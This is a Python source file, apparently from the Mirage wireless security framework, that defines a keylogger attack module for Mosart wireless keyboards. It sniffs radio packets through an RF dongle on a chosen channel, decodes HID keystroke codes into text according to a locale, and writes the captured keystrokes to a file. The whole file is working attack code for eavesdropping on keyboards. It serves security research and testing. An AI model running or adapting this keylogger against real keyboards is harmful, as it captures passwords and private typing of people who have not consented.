from mirage.libs import mosart,utils,io
from mirage.libs.common.hid import HIDMapping
from mirage.core import module


class mosart_keylogger(module.WirelessModule):
	def init(self):
		self.technology = "mosart"
		self.type = "attack"
		self.description = "Keystrokes logger module for Mosart keyboard"
		self.args = {
				"INTERFACE":"rfstorm0",
				"TARGET":"",
				"CHANNEL":"36",
				"LOCALE":"fr",
				"TIME":"",
				"TEXT_FILE":""
			}

		self.lastKey = None
		self.text = ""

	def checkSniffingCapabilities(self):
		return self.receiver.hasCapabilities("SNIFFING_NORMAL")

	def show(self,pkt):
		if pkt.state == "pressed":
			key = HIDMapping(locale=self.args["LOCALE"].lower()).getKeyFromHIDCode(pkt.hidCode,pkt.modifiers)
			if key is not None:
				
				if key != self.lastKey:
					io.info(key)
					self.text += key if len(key) == 1 else " ["+key+"] "
					self.lastKey = key
			else:
				io.fail("Unknown HID code and modifiers: hidCode = "+str(pkt.hidCode)+" | modifiers = "+str(pkt.modifiers))
		elif pkt.state == "released":
			self.lastKey = None

	def exportTextFile(self):
		io.info("Captured keystrokes: "+self.text)
		if self.args["TEXT_FILE"] != "":
			with open(self.args["TEXT_FILE"],"w") as f:
				io.success("Captured keystrokes stored as "+self.args["TEXT_FILE"])
				f.write(self.text)
				f.close()

	def run(self):
		self.receiver = self.getReceiver(interface=self.args["INTERFACE"])
		self.receiver.enterSnifferMode(utils.addressArg(self.args["TARGET"]))
		if self.checkSniffingCapabilities():
			self.receiver.onEvent("MosartKeyboardKeystrokePacket",callback=self.show)
			
			self.receiver.setChannel(utils.integerArg(self.args["CHANNEL"]))
			try:
				time = utils.integerArg(self.args['TIME']) if self.args["TIME"] != "" else None
				start = utils.now()
				while utils.now() - start <= time if time is not None else True:
					utils.wait(seconds=0.5)
			except KeyboardInterrupt:
				self.exportTextFile()
				self.receiver.removeCallbacks()
				return self.ok({"TEXT":self.text})

			self.exportTextFile()
			self.receiver.removeCallbacks()
			return self.ok({"TEXT":self.text})

		else:
			io.fail("Interface provided ("+str(self.args["INTERFACE"])+") is not able to run in sniffing mode.")
			return self.nok()
